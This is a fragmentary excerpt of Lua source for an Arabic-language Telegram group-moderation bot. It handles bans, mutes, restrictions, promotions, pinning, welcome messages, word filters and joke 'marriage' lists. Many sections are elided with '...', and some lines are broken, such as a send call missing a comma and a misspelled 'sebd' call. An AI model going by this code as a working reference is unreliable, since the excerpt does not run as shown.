send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n  𖦹  قائمه ازواج الجروب \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n  𖦹  تم زواجكم بنجاح في الجروب \n  𖦹  الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n  𖦹  تم طلاقكم بنجاح في الجروب\n  𖦹  اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
...
if database:get(bot_id..'Lock:kick'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل الحظر') 
return false
end
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع حظر البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع حظر ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if result.id_ then
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع حظر ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = result.id_, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"  𖦹  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
...
usertext = '\n  𖦹   المستخدم ⇎ ['..result.title_..'](t.me/'..(username or 'GLOBLA')..')'
status  = '\n  𖦹  تم حظره'
texts = usertext..status
chat_kick(msg.chat_id_, result.id_)
send(msg.chat_id_, msg.id_, texts)
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع حظر ( '..Rutba(userid,msg.chat_id_)..' )')
else
tdcli_function ({ ID = "ChangeChatMemberStatus", chat_id_ = msg.chat_id_, user_id_ = userid, status_ = { ID = "ChatMemberStatusKicked" },},function(arg,data) 
if (data and data.code_ and data.code_ == 400 and data.message_ == "CHAT_ADMIN_REQUIRED") then 
send(msg.chat_id_, msg.id_,'  𖦹  ليس لدي صلاحية حظر المستخدمين يرجى تفعيلها !') 
...
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then
send(msg.chat_id_, msg.id_, '  𖦹  انا لست محظورآ \n') 
return false 
end
...
send(msg.chat_id_, msg.id_, '  𖦹  تم مسح المكتومين')
end
...
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع كتم البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع كتم ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'  𖦹  البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
if Can_or_NotCan(result.id_, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع كتم ( '..Rutba(result.id_,msg.chat_id_)..' )')
else
if (result and result.type_ and result.type_.ID == "ChannelChatInfo") then
send(msg.chat_id_,msg.id_,"  𖦹  عذرا عزيزي المستخدم هاذا معرف قناة يرجى استخدام الامر بصوره صحيحه !")   
return false 
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم كتم لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
...
tdcli_function ({ID = "SearchPublicChat",username_ = TextEnd[4]}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
return false
end
if text and text:match("^كتم (%d+)$") and Mod(msg) then
...
if Can_or_NotCan(userid, msg.chat_id_) == true then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع كتم ( '..Rutba(userid,msg.chat_id_)..' )')
else
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'  𖦹  البوت ليس ادمن يرجى ترقيتي !') 
return false  
...
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, "  𖦹  لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹  تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n  𖦹  عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹   العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹   الايدي ⇎ `'..result.sender_user_id_..'`\n  𖦹   تم رفعه مشرف '
send(msg.chat_id_, msg.id_, usertext..status)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹   العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n  𖦹   الايدي ⇎ `'..result.sender_user_id_..'`\n  𖦹   تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
'\n𝙶𝚁𝙾𝚄𝙿 𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂'..
'\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ '..
'\n  𖦹  اعدادات الجروب كتالي √↓'..
'\nء•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•'..
'\n  𖦹   علامة ال {🔓} تعني مفعل'..
'\n  𖦹   علامة ال {🔐} تعني معطل'..
'\nء•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•'..
'\n  𖦹   الروابط ⇎ { '..lock_links..
' }\n'..'  𖦹   المعرفات ⇎ { '..lock_user..
' }\n'..'  𖦹   التاك ⇎ { '..lock_hash..
' }\n'..'  𖦹   البوتات ⇎ { '..lock_bots..
' }\n'..'  𖦹   التوجيه ⇎ { '..lock_fwd..
' }\n'..'  𖦹   التثبيت ⇎ { '..lock_pin..
' }\n'..'  𖦹   الاشعارات ⇎ { '..lock_tagservr..
' }\n'..'  𖦹   الماركدون ⇎ { '..lock_mark..
' }\n'..'  𖦹   التعديل ⇎ { '..lock_edit..
' }\n'..'  𖦹   تعديل الميديا ⇎ { '..lock_edit_med..
' }\nء•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•'..
'\n'..'  𖦹   الكلايش ⇎ { '..lock_spam..
' }\n'..'  𖦹   الكيبورد ⇎ { '..lock_inlin..
' }\n'..'  𖦹   الاغاني ⇎ { '..lock_vico..
' }\n'..'  𖦹   المتحركه ⇎ { '..lock_gif..
' }\n'..'  𖦹   الملفات ⇎ { '..lock_file..
' }\n'..'  𖦹   الدردشه ⇎ { '..lock_text..
...
' }\n'..'  𖦹   التكرار ⇎ { '..flood..
' }\n'..'  𖦹   الترحيب ⇎ { '..welcome..
' }\n'..'  𖦹   عدد التكرار ⇎ { '..NUM_MSG_MAX..
' }\nء•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•'..
'\n  𖦹   علامة ال {🔓} تعني مفعل'..
'\n  𖦹   علامة ال {🔐} تعني معطل'..
'\nء•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•'..
'\n'..'  𖦹   امر صيح ⇎ { '..kickme..
' }\n'..'  𖦹   امر اطردني ⇎ { '..sehuser..
' }\n'..'  𖦹   امر منو ضافني ⇎ { '..addme..
' }\n'..'  𖦹   الردود ⇎ { '..rdmder..
' }\n'..'  𖦹   الردود العامه ⇎ { '..rdsudo..
' }\n'..'  𖦹   الايدي ⇎ { '..idgp..
' }\n'..'  𖦹   الايدي بالصوره ⇎ { '..idph..
' }\n'..'  𖦹   الرفع ⇎ { '..setadd..
' }\n'..'  𖦹   الحظر ⇎ { '..banm..' }\n\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n  𖦹  قناة سورس يوسف ↓\n [ 𝐒𝐨𝐮𝐬𝐜𝐞](t.me/php14) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_,msg.id_,"  𖦹  عذرآ تم قفل التثبيت")  
return false  
end
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.reply_to_message_id_,disable_notification_ = 1},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"  𖦹  تم تثبيت الرساله")   
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.reply_to_message_id_)
elseif data.code_ == 6 then
send(msg.chat_id_,msg.id_,"  𖦹  انا لست ادمن هنا يرجى ترقيتي ادمن ثم اعد المحاوله")  
elseif data.message_ == "CHAT_NOT_MODIFIED" then
send(msg.chat_id_,msg.id_,"  𖦹  لا توجد رساله مثبته")  
elseif data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"  𖦹  ليست لدي صلاحية التثبيت يرجى التحقق من الصلاحيات")  
end
end,nil) 
end
...
if database:sismember(bot_id..'lock:pin',msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_,msg.id_,"  𖦹  عذرآ تم قفل الثبيت")  
return false  
end
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء تثبيت الرساله")   
...
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖦹  تم الغاء تثبيت الكل")   
...
send(msg.chat_id_,msg.id_,"  𖦹  حسنآ ارسل اليه الرابط الان")
...
send(msg.chat_id_, msg.id_,"  𖦹  تم تفعيل الصوره") 
return false  
end
end
...
send(msg.chat_id_, msg.id_,"  𖦹  تم تعطيل الصوره") 
return false end
end
 if text == "الرابط" then 
...
send(msg.chat_id_,msg.id_,"  𖦹  تم مسح الرابط")           
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل لي الصوره') 
return false
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم ازالة صورة الجروب') 
end
return false  
end
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الان الوصف')
end
return false  
end
...
t  = '  𖦹  ارسل لي الترحيب الان'
tt = '\n  𖦹  تستطيع اضافة مايلي !\n  𖦹  دالة عرض الاسم ⇎{`name`}\n  𖦹  دالة عرض المعرف ⇎{`user`}'
...
GetWelcome = '  𖦹  لم يتم تعيين ترحيب للكروب'
end 
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تفعيل ترحيب الجروب') 
return false  
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'حذف الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,'  𖦹  تم ازالة ترحيب الجروب') 
end
end
if text and text == "منع" and msg.reply_to_message_id_ == 0 and Manager(msg)  then       
send(msg.chat_id_, msg.id_,"  𖦹  ارسل الكلمه لمنعها")  
...
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_,"  𖦹  ارسل التحذير عند ارسال الكلمه")  
...
if test == "repp" then  
send(msg.chat_id_, msg.id_,"  𖦹  تم منع الكلمه مع التحذير")  
...
send(msg.chat_id_, msg.id_,"  𖦹  ارسل الكلمه الان")  
database:set(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test and test == "reppp" then   
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء منعها")  
database:del(bot_id.."DRAGON1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
send(msg.chat_id_, msg.id_,"  𖦹  تم مسح قائمه المنع")  
end
...
send(msg.chat_id_,msg.id_,'  𖦹  تم الغاء حفظ كليشة المطور')
return false
end
database:set(bot_id..'TEXT_SUDO',text)
database:del(bot_id..'Set:TEXT_SUDO'..msg.chat_id_..':'..msg.sender_user_id_)
send(msg.chat_id_,msg.id_,'  𖦹  تم حفظ كليشة المطور')
return false
end
-----------------
...
send(msg.chat_id_, msg.id_, '  𖦹  تم ازالة كليشة الايدي')
end
return false  
end 
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_,"  𖦹  تم الغاء تعين الايدي") 
...
send(msg.chat_id_, msg.id_,'  𖦹  تم تعين الايدي')    
end
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, "  𖦹  لا توجد بوتات في الجروب")
else
local t = '  𖦹  عدد البوتات هنا >> {'..c..'}\n  𖦹  عدد البوتات التي هي ادمن >> {'..x..'}\n  𖦹  تم طرد >> {'..(c - x)..'} من البوتات'
send(msg.chat_id_, msg.id_,t) 
end 
end,nil)  
end   
...
if #admins == i then 
local a = '\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n  𖦹  عدد البوتات التي هنا >> {'..n..'} بوت\n'
local f = '  𖦹  عدد البوتات التي هي ادمن >> {'..t..'}\n  𖦹  ملاحضه علامة ال ( 𖦹 ) تعني ان البوت ادمن \n'
...
if text == 'الغاء' then 
send(msg.chat_id_, msg.id_, "  𖦹  تم الغاء حفظ القوانين") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
return false  
end 
database:set(bot_id.."Set:Rules:Group" .. msg.chat_id_,text) 
send(msg.chat_id_, msg.id_,"  𖦹  تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
send(msg.chat_id_,msg.id_,"  𖦹  ارسل لي القوانين الان")  
end
end
if text == 'مسح القوانين' or text == 'حذف القوانين' then  
if Mod(msg) then
send(msg.chat_id_, msg.id_,"  𖦹  تم ازالة قوانين الجروب")  
...
send(msg.chat_id_, msg.id_,"  𖦹  لا توجد قوانين")   
end    
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم طرد المحذوفين')
end,nil)
end
end
...
if #list == 0 then
send(msg.chat_id_, msg.id_,'  𖦹  لا توجد صلاحيات مضافه')
return false
end
t = "\n  𖦹  قائمة الصلاحيات المضافه \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_, "  𖦹  ارسل نوع الرتبه \n  𖦹  {عـضـو -- ممـيـز -- ادمـن -- مـديـر}") 
end
...
send(msg.chat_id_, msg.id_, "*  𖦹  تم مسح الصلاحيه *\n") 
end
...
if text == 'مدير' then
if not Constructor(msg) then
send(msg.chat_id_, msg.id_"*  𖦹  تستطيع اضافه صلاحيات {ادمن - مميز - عضو} \n  𖦹  ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'ادمن' then
if not Manager(msg) then 
send(msg.chat_id_, msg.id_,"*  𖦹  تستطيع اضافه صلاحيات {مميز - عضو} \n  𖦹  ارسل الصلاحيه مجددا*\n") 
return false
end
end
if text == 'مميز' then
if not Mod(msg) then
send(msg.chat_id_, msg.id_,"*  𖦹   تستطيع اضافه صلاحيات {عضو} \n  𖦹  ارسل الصلاحيه مجددا*\n") 
return false
end
end
...
send(msg.chat_id_, msg.id_, "  𖦹  تـم اضـافـه الامـر") 
database:del(bot_id.."Comd:New"..msg.chat_id_..""..msg.sender_user_id_) 
return false  
end 
end
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n  𖦹  العضو ⇎ ['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n  𖦹  تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'  𖦹  تم مسح رسائلك'  )  
...
send(msg.chat_id_, msg.id_,'  𖦹  عدد رسائلك ⇎ { '..database:get(bot_id..'Msg_User'..msg.chat_id_..':'..msg.sender_user_id_)..'}' ) 
end 
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,' 𖦹 تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
send(msg.chat_id_,msg.id_,' 𖦹  تم حذف {'..num..'}')  
...
send(msg.chat_id_, msg.id_," 𖦹  تم تنظيف جميع الميديا")
end
...
local Message = v
if Message then
t = " 𖦹  تم مسح "..k.." من الوسائط الموجوده"
DeleteMessage(msg.chat_id_,{[0]=Message})
database:del(bot_id.."S00F4:allM"..msg.chat_id_)
end
end
if #list == 0 then
t = " 𖦹  لا يوجد ميديا في المجموعه"
end
send(msg.chat_id_, msg.id_, t)
end
...
local numl = v
if numl then
l = " 𖦹  عدد الميديا الموجود هو "..k
end
end
if #num == 0 then
l = " 𖦹  لا يوجد ميديا في المجموعه"
end
...
send(msg.chat_id_, msg.id_,' 𖦹  تم تنظيف جميع الرسائل المعدله')
end
...
database:setex(bot_id..'Set:Name:Bot'..msg.sender_user_id_,300,true) 
send(msg.chat_id_, msg.id_,"  𖦹  ارسل لي الاسم الان ")  
end
return false
end
...
local Namebot = (database:get(bot_id..'Name:Bot') or 'يوسف')
local DRAGON_Msg = {
...
send(msg.chat_id_, msg.id_,'  𖦹  الاذاعه معطله من قبل المطور الاساسي')
return false
end
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
...
if data.message_ == "CHAT_ADMIN_REQUIRED" then
send(msg.chat_id_,msg.id_,"  𖦹  ليست لدي صلاحية تغير اسم الجروب")  
else
sebd(msg.chat_id_,msg.id_,'  𖦹  تم تغيير اسم الجروب الى {['..Name..']}')  
end
end,nil) 
end
...
send(msg.chat_id_, msg.id_," 𖦹  لا تستطيع تنزيل المطور الاساسي")
return false 
end
...
send(msg.chat_id_, msg.id_,"\n 𖦹  تم تنزيل الشخص من الرتب التاليه \n 𖦹   { "..dev..""..crr..""..cr..""..own..""..mod..""..mn..""..vip.." } \n")
else
send(msg.chat_id_, msg.id_,"\n 𖦹   عذرا العضو لايملك رتبه \n")
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = text:match("^تنزيل الكل @(.*)$")}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
end
...
send(msg.chat_id_, msg.id_,"  𖦹  تم مسح الردود العامه")
end

if text == ("الردود العامه") and DevSoFi(msg) then 
local list = database:smembers(bot_id..'List:Rd:Sudo')
text = "\n  𖦹  قائمة الردود العامه \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
for k,v in pairs(list) do
...
send(msg.chat_id_, msg.id_,'  𖦹  تم حفظ الرد')
return false  
end  
end
if text and text:match("^(.*)$") then
if database:get(bot_id..'Set:Rd'..msg.sender_user_id_..':'..msg.chat_id_) == 'true' then
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الرد الذي تريد اضافته')
...
send(msg.chat_id_, msg.id_,'  𖦹  تم ازالة الرد العام')
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الكلمه تريد اضافتها')
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الكلمه تريد حذفها')
...
send(msg.chat_id_, msg.id_," 𖦹  تم حذف الرد من ردود المتعدده")
...
send(msg.chat_id_, msg.id_," 𖦹 تم حذف ردود المتعدده")
end
------------------------------------------------------------------------
if text1 then 
...
send(msg.chat_id_, msg.id_,"  𖦹  تم مسح الردود")
end
...
send(msg.chat_id_, msg.id_,'  𖦹  تم ازالة الرد ')
database:del(bot_id.."Add:Rd:Manager:Gif"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Vico"..text..msg.chat_id_)   
database:del(bot_id.."Add:Rd:Manager:Stekrs"..text..msg.chat_id_)     
database:del(bot_id.."Add:Rd:Manager:Text"..text..msg.chat_id_)   
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الكلمه التي تريد اضافتها')
...
send(msg.chat_id_, msg.id_,'  𖦹  ارسل الكلمه التي تريد حذفها')
...
local Text =' 𖦹 تم اختيار المقطع الصوتي لك'
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐒𝐨𝐮𝐬𝐜𝐞.',url="t.me/php14"}},
}
local msg_id = msg.id_/2097152/0.5
...
send(msg.chat_id_, msg.id_,' 𖦹 لا يمكنني تعديل  او وضع لقب ليس لدي صلاحيه\n  𖦹 قم بترقيتي جميع الصلاحيات او صلاحية اضافه مشرف ') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖦹  العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..') '
status  = '\n 𖦹  الايدي ⇎ '..result.sender_user_id_..'\n 𖦹 تم ضافه {'..timsh..'} كلقب له'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=True&can_restrict_members=false&can_pin_messages=True&can_promote_members=false")
...
function 𝐲𝐨𝐮𝐬𝐮𝐟t_function(extra, result, success)
if msg.can_be_deleted_ == false then 
send(msg.chat_id_, msg.id_,'  𖦹  البوت ليس مشرف يرجى ترقيتي !') 
return false  
end
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n  𖦹   العضو ⇎ ['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
send(msg.chat_id_, msg.id_,' 𖦹 وينك وين القب ') 
else
send(msg.chat_id_, msg.id_,' 𖦹 لقبك هو : '..GeId.result.custom_title) 
end
end
...
send(msg.chat_id_, msg.id_,'\n  𖦹 صلاحيات البوت هي\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n 𖦹   علامة ال {✔️} تعني مفعل\n 𖦹   علامة ال {✖} تعني غير مفعل\n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n 𖦹 تغير معلومات المجموعة ↞ '..INf..'\n 𖦹 حذف الرسائل ↞ '..DEL..'\n 𖦹 حظر المستخدمين ↞ '..REs..'\n 𖦹 دعوة المستخدمين ↞ '..INv..'\n 𖦹 ثتبيت الرسالة ↞ '..Pin..'\n 𖦹 اضافة مشرفين ↞ '..PRo)   
end
end
...
end --الكود حصري سورس يوسف يعني لو بكتهن راح اعرفك انت الاخذتهن
local t = "\n 𖦹 المستخدم ~ ["..User_id .."] يصيح المشرفين \n•═════•| 𖦹𝐲𝐨𝐮𝐬𝐮𝐟𖦹 |•═════•\n"
k = 0
...
return send(msg.chat_id_, msg.id_," 𖦹 ارسل الرد الذي اريد اضافته")
end
...
return send(msg.chat_id_, msg.id_," 𖦹 ارسل الان الكلمه لحذفها ")
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖦹 تم حفظ الرد الاول ارسل الرد الثاني")
return false  
end  
end
if text then  
...
send(msg.chat_id_, msg.id_," 𖦹 تم حفظ الرد الثاني ارسل الرد الثالث")
return false  
end  
end
if text then  
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'يوسف').." غادر" or text == 'غادر' then  
...
if text == 'بوت' then
Namebot = (database:get(bot_id..'Name:Bot') or 'يوسف')
...
Text = '  𖦹  تم تفعيل مغادرة البوت'
database:del(bot_id..'Left:Bot'..msg.chat_id_)  
else
Text = '  𖦹  بالتاكيد تم تفعيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_,Text) 
end
if text == 'تعطيل المغادره' and DevSoFi(msg) then  
if not database:get(bot_id..'Left:Bot'..msg.chat_id_) then
Text = '  𖦹  تم تعطيل مغادرة البوت'
database:set(bot_id..'Left:Bot'..msg.chat_id_,true)   
else
Text = '  𖦹  بالتاكيد تم تعطيل مغادرة البوت'
end
send(msg.chat_id_, msg.id_, Text) 
end
...
Text = '\n  𖦹  تم تفعيل الردود العامه' 
else
Text = '\n  𖦹  بالتاكيد تم تفعيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل الردود العامه' 
else
Text = '\n  𖦹  بالتاكيد تم تعطيل الردود العامه'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تفعيل الايدي بالصور' 
else
Text = '\n  𖦹  بالتاكيد تم تفعيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
Text = '\n  𖦹  تم تعطيل الايدي بالصوره' 
else
Text = '\n  𖦹  بالتاكيد تم تعطيل الايدي بالصوره'
end
send(msg.chat_id_, msg.id_,Text) 
end
...
send(msg.chat_id_, msg.id_,'  𖦹  ايديه ~⪼ '..iduser..'\n  𖦹  معرفه ~⪼ '..username..'\n  𖦹  رتبته ~⪼ '..rtp..'\n  𖦹  تعديلاته ~⪼ '..edit..'\n  𖦹  نقاطه ~⪼ '..NUMPGAME..'\n  𖦹  جهاته ~⪼ '..Contact..'\n  𖦹  رسائله ~⪼ '..Msguser..'')
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
end
...
send(msg.chat_id_, msg.id_,'  𖦹  المعرف غير صحيح ')
end
end
tdcli_function ({ID = "SearchPublicChat",username_ = username}, 𝐲𝐨𝐮𝐬𝐮𝐟t_function, nil)
end
...
send(msg.chat_id_, msg.id_,'  𖦹  رتبتك في البوت ⇎ '..rtp)
end

if text == 'انا مين' and SudoBot(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/php14)') 
return false
end

if text == 'انا مين' and DevSoFi(msg) then 
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/php14)') 
return false
end

if text == 'انا مين' and Sudo(msg) then 
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/php14)') 
return false
end

